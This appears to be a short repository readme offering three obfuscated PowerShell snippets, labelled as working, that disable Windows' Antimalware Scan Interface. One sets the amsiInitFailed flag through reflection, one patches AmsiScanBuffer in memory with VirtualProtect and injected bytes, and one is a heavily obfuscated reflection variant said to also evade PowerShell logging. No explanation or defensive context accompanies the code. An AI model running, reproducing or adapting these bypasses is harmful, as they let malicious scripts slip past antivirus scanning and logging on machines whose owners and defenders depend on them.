# AMSI-Bypass (working at the time of writing)


## AMSI Bypass 1
```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```


## AMSI Bypass 2
```
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## AMSI Bypass 3
```
#Matt Graebers Reflection method with WMF5 autologging bypass 
$RCENlzul=$null;$aiduefdm="$(('Syst'+'em').NoRmaLize([cHar](28+42)+[CHar]([bYTe]0x6f)+[CHAR](40+74)+[ChAr](109)+[char]([bYTE]0x44)) -replace [Char](52+40)+[cHaR]([BYTE]0x70)+[chAR]([ByTe]0x7b)+[cHar]([bYTe]0x4d)+[CHAr]([ByTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Mán'+'äge'+'men'+'t').nOrMALizE([cHAr](53+17)+[ChAR](93+18)+[cHar](114)+[CHar]([byTE]0x6d)+[CHaR]([byTE]0x44)) -replace [cHAR]([byTE]0x5c)+[CHAr]([bYtE]0x70)+[chAR]([BytE]0x7b)+[cHAr]([ByTE]0x4d)+[CHar](53+57)+[CHar]([byte]0x7d)).$(('Ãutõmàt'+'íõn').NOrMALizE([chaR]([byTE]0x46)+[ChAR]([Byte]0x6f)+[ChaR](114)+[ChaR](109+32-32)+[ChAR](68+39-39)) -replace [CHAr]([bYTe]0x5c)+[CHAr]([BYTE]0x70)+[chaR]([bYTe]0x7b)+[cHaR]([bytE]0x4d)+[CHAr](110*59/59)+[cHar]([bytE]0x7d)).$([chAr](65+45-45)+[chAR](1+108)+[chaR]([BytE]0x73)+[CHaR]([bYTe]0x69)+[chAR]([byTe]0x55)+[cHAR](116)+[CHaR](105)+[CHaR](108+10-10)+[cHAr]([bYte]0x73))";$reyzaeu="+('tnfázxxtbncvrqkf'+'kî').NORMaLIZE([ChAR](70*1/1)+[ChAr]([byTE]0x6f)+[CHAr](114*34/34)+[cHaR](1+108)+[cHAR](68)) -replace [chAr]([byTe]0x5c)+[CHAR]([byte]0x70)+[cHAR]([BYte]0x7b)+[Char]([Byte]0x4d)+[char]([BYtE]0x6e)+[cHaR]([BYtE]0x7d)";[Threading.Thread]::Sleep(546);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($(('$(('Syst'+'em').NoRmaLize([cHar](28+42)+[CHar]([bYTe]0x6f)+[CHAR](40+74)+[ChAr](109)+[char]([bYTE]0x44)) -replace [Char](52+40)+[cHaR]([BYTE]0x70)+[chAR]([ByTe]0x7b)+[cHar]([bYTe]0x4d)+[CHAr]([ByTe]0x6e)+[cHAR]([bYte]0x7d)).Reflectîón.'+'BìndìngFlãgs').NOrmAlIze([cHar]([byTe]0x46)+[CHAr]([bYTe]0x6f)+[ChAr]([Byte]0x72)+[CHAR](83+26)+[CHar]([bYTe]0x44)) -replace [char](36+56)+[cHaR](112)+[char]([ByTE]0x7b)+[ChAr](77+1-1)+[cHAr]([bytE]0x6e)+[ChaR](125+19-19)))).FullName), $(('Syst'+'em').NoRmaLize([cHar](28+42)+[CHar]([bYTe]0x6f)+[CHAR](40+74)+[ChAr](109)+[char]([bYTE]0x44)) -replace [Char](52+40)+[cHaR]([BYTE]0x70)+[chAR]([ByTe]0x7b)+[cHar]([bYTe]0x4d)+[CHAr]([ByTe]0x6e)+[cHAR]([bYte]0x7d)).Reflection.FieldInfo]" -as [String].Assembly.GetType($(('Syste'+'m.Typ'+'e').nORMALize([ChAR](70+51-51)+[ChaR](111+51-51)+[chAr]([ByTe]0x72)+[chAR](109+28-28)+[cHar]([bytE]0x44)) -replace [CHAr]([bytE]0x5c)+[char](112*12/12)+[ChAr](123+65-65)+[chAR]([BYte]0x4d)+[ChAr]([bYTE]0x6e)+[ChAr]([bYTE]0x7d)))), [Object]([Ref].Assembly.GetType($aiduefdm)),($([cHAr](1+70)+[cHar](101+8-8)+[CHaR]([BYte]0x74)+[ChAr]([Byte]0x46)+[CHaR]([bYTe]0x69)+[cHAr](101+21-21)+[CHar]([bYTe]0x6c)+[cHAr](100)))).Invoke($(('ä'+'m'+'s'+'î'+'Î'+'n'+'ì'+'t'+'F'+'ã'+'î'+'l'+'e'+'d').NORmaliZE([ChAr]([bYTe]0x46)+[cHaR](111)+[CHAR](114*47/47)+[CHaR](109)+[chaR](68*27/27)) -replace [chaR](92)+[cHAr](112*34/34)+[CHAR](123*12/12)+[cHAR]([BYTE]0x4d)+[CHAr]([bYTE]0x6e)+[chAR]([bYtE]0x7d)),(("NonPublic,Static") -as [String].Assembly.GetType($(('$(('Syst'+'em').NoRmaLize([cHar](28+42)+[CHar]([bYTe]0x6f)+[CHAR](40+74)+[ChAr](109)+[char]([bYTE]0x44)) -replace [Char](52+40)+[cHaR]([BYTE]0x70)+[chAR]([ByTe]0x7b)+[cHar]([bYTe]0x4d)+[CHAr]([ByTe]0x6e)+[cHAR]([bYte]0x7d)).Reflectîón.'+'BìndìngFlãgs').NOrmAlIze([cHar]([byTe]0x46)+[CHAr]([bYTe]0x6f)+[ChAr]([Byte]0x72)+[CHAR](83+26)+[CHar]([bYTe]0x44)) -replace [char](36+56)+[cHaR](112)+[char]([ByTE]0x7b)+[ChAr](77+1-1)+[cHAr]([bytE]0x6e)+[ChaR](125+19-19))))).SetValue($RCENlzul,$True);
```

